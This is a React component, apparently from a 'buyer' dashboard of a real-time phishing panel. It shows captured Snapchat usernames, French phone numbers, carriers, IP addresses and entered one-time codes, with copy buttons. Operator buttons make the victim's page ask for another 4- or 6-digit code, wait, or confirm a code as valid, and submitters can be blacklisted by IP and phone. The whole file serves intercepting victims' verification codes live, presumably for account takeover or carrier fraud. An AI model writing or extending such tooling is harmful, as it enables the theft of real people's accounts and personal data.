import { useState } from "react";
import { motion } from "framer-motion";
import { Send, Hash, Ban, Clock, X, Copy, Check } from "lucide-react";
import { base44 } from "@/api/base44Client";
import { t } from "@/components/buyer/i18n";

function formatFull(tel) {
  const d = String(tel || "").replace(/\D/g, "");
  return "+" + d;
}

function CopyField({ label, value, bg }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(String(value));
      setCopied(true);
      setTimeout(() => setCopied(false), 1200);
    } catch {}
  };
  return (
    <div className="rounded-xl px-3 py-2.5 flex items-center justify-between gap-3" style={{ backgroundColor: bg }}>
      <div className="min-w-0">
        <div className="text-[10px] font-bold uppercase tracking-wider text-slate-500">{label}</div>
        <div className="text-sm font-semibold text-slate-900 truncate">{value}</div>
      </div>
      <button
        onClick={copy}
        className="shrink-0 px-2.5 py-1 rounded-lg bg-white border border-slate-300 text-[11px] font-bold text-slate-700 hover:bg-slate-50 transition-colors flex items-center gap-1"
      >
        {copied ? <><Check className="w-3 h-3" /> Copied</> : <><Copy className="w-3 h-3" /> Copy</>}
      </button>
    </div>
  );
}

export default function SubmissionActions({ sub, discord, lang, buyerId, onDone }) {
  const [busy, setBusy] = useState(null);
  const [result, setResult] = useState("");
  const [sentLabel, setSentLabel] = useState("");
  const [isError, setIsError] = useState(false);

  const verdictLabels = {
    valid: lang === "fr" ? "Code validé ✓" : "Code approved ✓",
    resend: lang === "fr" ? "Renvoi autorisé ✓" : "Resend allowed ✓",
    wrong: t(lang, "wrong"),
  };

  const runAction = async (action) => {
    setBusy(action);
    setResult("");
    setSentLabel("");
    setIsError(false);
    try {
      const res = await base44.functions.invoke("sendCode", { submissionId: sub.id, action, discord, buyerId });
      if (res?.data?.discord_required) {
        setIsError(true);
        setResult(lang === "fr" ? "Identification Discord requise" : "Discord identification required");
      } else if (res?.data?.error) {
        setIsError(true);
        setResult(res.data.error);
      } else {
        const label = verdictLabels[action] || actions.find((a) => a.key === action)?.label || action;
        setSentLabel(label);
        setResult(lang === "fr" ? "Action envoyée ✓" : "Action sent ✓");
        if (action === "valid" || action === "wrong") setTimeout(() => onDone?.(), 1200);
        else setTimeout(() => onDone?.({ reloadOnly: true }), 800);
      }
    } catch (err) {
      setIsError(true);
      setSentLabel("");
      setResult(err?.response?.data?.error || (lang === "fr" ? "Échec" : "Failed"));
    }
    setBusy(null);
  };

  const runBlacklist = async () => {
    setBusy("blacklist");
    setResult("");
    try {
      await base44.functions.invoke("blacklistUser", {
        ip: sub.ip_address,
        telephone: sub.telephone,
        submissionId: sub.id,
      });
      await base44.functions.invoke("sendCode", { submissionId: sub.id, action: "wrong", discord, buyerId }).catch(() => {});
      setSentLabel(t(lang, "blacklist"));
      setIsError(false);
      setResult(lang === "fr" ? "Blacklisté ✓" : "Blacklisted ✓");
      setTimeout(() => onDone?.(), 1200);
    } catch (err) {
      setIsError(true);
      setSentLabel("");
      setResult(err?.response?.data?.error || (lang === "fr" ? "Échec" : "Failed"));
    }
    setBusy(null);
  };

  const actions = [
    { key: "code_ready", label: t(lang, "code4"), icon: Send, style: { backgroundColor: "#00a86b", color: "#fff" } },
    { key: "code6", label: t(lang, "code6"), icon: Hash, style: { backgroundColor: "#9b59b6", color: "#fff" } },
    { key: "code6sfr", label: t(lang, "code6sfr"), icon: Hash, style: { backgroundColor: "#e74c3c", color: "#fff" } },
    { key: "code6orange", label: t(lang, "code6orange"), icon: Hash, style: { backgroundColor: "#ff6600", color: "#fff" } },
    { key: "wrong", label: t(lang, "wrong"), icon: X, style: { backgroundColor: "#f39c12", color: "#fff" } },
    { key: "wait", label: t(lang, "wait"), icon: Clock, style: { backgroundColor: "#3498db", color: "#fff" } },
  ];

  const opBg = {
    SFR: "#fdecea",
    Bouygues: "#e3f2fd",
    Orange: "#fff3e0",
  };

  if (sub.entered_code) {
    return (
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-white rounded-2xl p-5 shadow-xl shadow-black/20 border border-slate-200"
      >
        <div className="flex items-center justify-between mb-4">
          <span className="px-2.5 py-1 rounded-md text-[11px] font-bold text-slate-700" style={{ backgroundColor: "#f3f4f6" }}>
            {lang === "fr" ? "OTP soumis" : "OTP submitted"}
          </span>
          <span className="px-2.5 py-1 rounded-full text-[11px] font-bold" style={{ backgroundColor: opBg[sub.operateur] || opBg.Bouygues, color: "#1565c0" }}>
            {sub.operateur}
          </span>
        </div>

        <div className="space-y-2.5 mb-4">
          <CopyField label={lang === "fr" ? "Pseudo Snapchat" : "Snapchat user"} value={`@${sub.snapchat}`} bg="#f3f4f6" />
          <CopyField label={lang === "fr" ? "Numéro de téléphone" : "Phone number"} value={formatFull(sub.telephone)} bg="#f0fdf4" />
          <CopyField label={lang === "fr" ? "Opérateur" : "Operator"} value={sub.operateur} bg="#f0f9ff" />
          <CopyField label={lang === "fr" ? "Code OTP" : "OTP code"} value={sub.entered_code} bg="#f5f3ff" />
        </div>

        <div className="grid grid-cols-2 gap-2.5">
          {[
            { key: "valid", label: lang === "fr" ? "Valider le code" : "Validate code", icon: Check, style: { backgroundColor: "#059669", color: "#fff" } },
            { key: "wrong", label: lang === "fr" ? "Changer le numéro" : "Change number", icon: X, style: { backgroundColor: "#e74c3c", color: "#fff" } },
            { key: "code_ready", label: lang === "fr" ? "Renvoyer (4 ch.)" : "Resend (4)", icon: Send, style: { backgroundColor: "#00a86b", color: "#fff" } },
            { key: "code6sfr", label: lang === "fr" ? "Renvoyer (SFR)" : "Resend (SFR)", icon: Hash, style: { backgroundColor: "#e74c3c", color: "#fff" } },
            { key: "code6orange", label: lang === "fr" ? "Renvoyer (Orange)" : "Resend (Orange)", icon: Hash, style: { backgroundColor: "#ff6600", color: "#fff" } },
            { key: "code6", label: lang === "fr" ? "Renvoyer (Xbox)" : "Resend (Xbox)", icon: Hash, style: { backgroundColor: "#9b59b6", color: "#fff" } },
          ].map((a) => {
            const Icon = a.icon;
            return (
              <button
                key={a.key}
                onClick={() => runAction(a.key)}
                disabled={!!busy}
                className="flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold hover:opacity-90 transition-opacity disabled:opacity-50"
                style={a.style}
              >
                {busy === a.key ? <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : <Icon className="w-3.5 h-3.5" />}
                {a.label}
              </button>
            );
          })}
        </div>
        <button
          onClick={runBlacklist}
          disabled={!!busy}
          className="w-full mt-2.5 flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold bg-transparent transition-colors disabled:opacity-50"
          style={{ border: "1.5px solid #e74c3c", color: "#e74c3c" }}
        >
          {busy === "blacklist" ? <span className="w-3.5 h-3.5 border-2 border-red-300 border-t-red-500 rounded-full animate-spin" /> : <Ban className="w-3.5 h-3.5" />}
          {t(lang, "blacklist")}
        </button>

        {result && (
          <div
            className="mt-4 rounded-xl px-4 py-4 text-center"
            style={{ backgroundColor: isError ? "#fdecea" : "#e8f5e9", border: `1.5px solid ${isError ? "#e74c3c" : "#27ae60"}` }}
          >
            {sentLabel && (
              <div className="text-base font-bold mb-1" style={{ color: isError ? "#c0392b" : "#1e7e34" }}>
                {sentLabel}
              </div>
            )}
            <div className="text-xl font-extrabold leading-tight" style={{ color: isError ? "#e74c3c" : "#27ae60" }}>
              {result}
            </div>
          </div>
        )}
      </motion.div>
    );
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-white rounded-2xl p-5 shadow-xl shadow-black/20 border border-slate-200"
    >
      <div className="flex items-center justify-between mb-4">
        <span className="px-2.5 py-1 rounded-md text-[11px] font-bold text-slate-700" style={{ backgroundColor: "#f5f5f5" }}>
          {t(lang, "lockedByYou")}
        </span>
        <span
          className="px-2.5 py-1 rounded-full text-[11px] font-bold"
          style={{ backgroundColor: opBg[sub.operateur] || opBg.Bouygues, color: "#1565c0" }}
        >
          {sub.operateur}
        </span>
      </div>

      <div className="space-y-2.5 mb-4">
        <CopyField label={lang === "fr" ? "Pseudo Snapchat" : "Snapchat user"} value={`@${sub.snapchat}`} bg="#f5f5f5" />
        <CopyField label={lang === "fr" ? "Numéro de téléphone" : "Phone number"} value={formatFull(sub.telephone)} bg="#e8f5e9" />
        <CopyField label={lang === "fr" ? "Opérateur" : "Operator"} value={sub.operateur} bg="#e3f2fd" />
        {sub.ip_address && (
          <CopyField label="IP" value={sub.ip_address} bg="#f3e5f5" />
        )}
      </div>

      <div className="grid grid-cols-2 gap-2.5">
        {actions.map((a) => {
          const Icon = a.icon;
          return (
            <button
              key={a.key}
              onClick={() => runAction(a.key)}
              disabled={!!busy}
              className="flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold hover:opacity-90 transition-opacity disabled:opacity-50"
              style={a.style}
            >
              {busy === a.key ? (
                <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
              ) : (
                <Icon className="w-3.5 h-3.5" />
              )}
              {a.label}
            </button>
          );
        })}
      </div>
      <button
        onClick={runBlacklist}
        disabled={!!busy}
        className="w-full mt-2.5 flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold bg-transparent transition-colors disabled:opacity-50"
        style={{ border: "1.5px solid #e74c3c", color: "#e74c3c" }}
      >
        {busy === "blacklist" ? (
          <span className="w-3.5 h-3.5 border-2 border-red-300 border-t-red-500 rounded-full animate-spin" />
        ) : (
          <Ban className="w-3.5 h-3.5" />
        )}
        {t(lang, "blacklist")}
      </button>
      {result && (
        <div
          className="mt-4 rounded-xl px-4 py-4 text-center"
          style={{ backgroundColor: isError ? "#fdecea" : "#e8f5e9", border: `1.5px solid ${isError ? "#e74c3c" : "#27ae60"}` }}
        >
          {sentLabel && (
            <div className="text-base font-bold mb-1" style={{ color: isError ? "#c0392b" : "#1e7e34" }}>
              {sentLabel}
            </div>
          )}
          <div className="text-xl font-extrabold leading-tight" style={{ color: isError ? "#e74c3c" : "#27ae60" }}>
            {result}
          </div>
        </div>
      )}
    </motion.div>
  );
}